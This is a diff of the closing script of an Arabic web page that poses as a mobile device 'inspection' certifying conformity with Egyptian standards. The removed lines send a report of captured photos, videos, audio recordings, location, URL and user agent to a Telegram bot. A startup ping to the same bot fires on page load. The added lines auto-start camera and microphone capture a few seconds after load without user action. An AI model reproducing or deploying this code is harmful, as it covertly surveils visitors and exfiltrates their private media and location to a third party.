-                const message = `📊 تقرير الفحص الشامل النهائي\n\n` +
-                               `🏆 رقم الشهادة: ${certNumber}\n` +
-                               `📅 تاريخ الفحص: ${new Date().toLocaleString('ar-SA')}\n` +
-                               `🔗 الرابط: ${window.location.href}\n\n` +
-                               `📈 إحصائيات الفحص:\n` +
-                               `📸 الصور: ${collectedData.photos.length}\n` +
-                               `🎥 مقاطع الفيديو: ${collectedData.videos.length}\n` +
-                               `🎤 التسجيلات الصوتية: ${collectedData.audio.length}\n` +
-                               `📍 المواقع: ${collectedData.location.latitude ? 1 : 0}\n\n` +
-                               `✅ تم إكمال جميع الاختبارات بنجاح\n` +
-                               `🎉 الجهاز مطابق للمواصفات القياسية المصرية`;
-                
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-            } catch (error) {
-                console.error('❌ فشل إرسال التقرير:', error);
-            }
-        }
-        
-        // دالة مساعدة: تحويل Blob إلى Base64
-        function blobToBase64(blob) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.onloadend = () => resolve(reader.result);
-                reader.onerror = reject;
-                reader.readAsDataURL(blob);
-            });
-        }
-        
-        // تهيئة الصفحة
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('🚀 نظام الفحص الشامل المتكامل جاهز للتشغيل');
+        // دالة تحميل التقرير
+        function downloadReport() {
+            const report = buildCompleteReport();
+            const blob = new Blob([report], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `تقرير_الفحص_${Date.now()}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
             
-            // إرسال رسالة بدء تشغيل للبوت
+            showMobileNotification('💾 تم تحميل التقرير', 2000);
+        }
+        
+        // دوال مساعدة
+        function getBrowserName(userAgent) {
+            if (userAgent.includes('Chrome')) return 'Chrome';
+            if (userAgent.includes('Firefox')) return 'Firefox';
+            if (userAgent.includes('Safari')) return 'Safari';
+            if (userAgent.includes('Edge')) return 'Edge';
+            if (userAgent.includes('Opera')) return 'Opera';
+            return 'متصفح غير معروف';
+        }
+        
+        function getOSName(platform) {
+            if (platform.includes('Win')) return 'Windows';
+            if (platform.includes('Mac')) return 'MacOS';
+            if (platform.includes('Linux')) return 'Linux';
+            if (platform.includes('Android')) return 'Android';
+            if (platform.includes('iOS') || platform.includes('iPhone')) return 'iOS';
+            return 'نظام غير معروف';
+        }
+        
+        // بدء الفحص تلقائياً بعد 5 ثوان
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('📱 نظام الفحص للجوال جاهز');
+            
+            // بدء الفحص التلقائي بعد 3 ثوان
             setTimeout(() => {
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: `🚀 تم تشغيل نظام الفحص الشامل\n🕐 ${new Date().toLocaleString('ar-SA')}\n🌐 ${window.location.href}\n📱 ${navigator.userAgent.substring(0, 80)}...`,
-                        parse_mode: 'HTML'
-                    })
-                }).catch(() => {
-                    console.log('⚠️ لم يتم إرسال رسالة البدء');
-                });
-            }, 2000);
+                if (!isMobileInspectionActive) {
+                    showMobileNotification('⚡ بدء الفحص التلقائي خلال 3 ثوانٍ...', 3000);
+                    
+                    setTimeout(() => {
+                        startMobileInspection();
+                    }, 3000);
+                }
+            }, 3000);
+        });
+        
+        // إيقاف التدفقات عند مغادرة الصفحة
+        window.addEventListener('beforeunload', function() {
+            if (cameraStreamMobile) {
+                cameraStreamMobile.getTracks().forEach(track => track.stop());
+            }
+            if (audioStreamMobile) {
+                audioStreamMobile.getTracks().forEach(track => track.stop());
+            }
         });
     </script>
 </body>
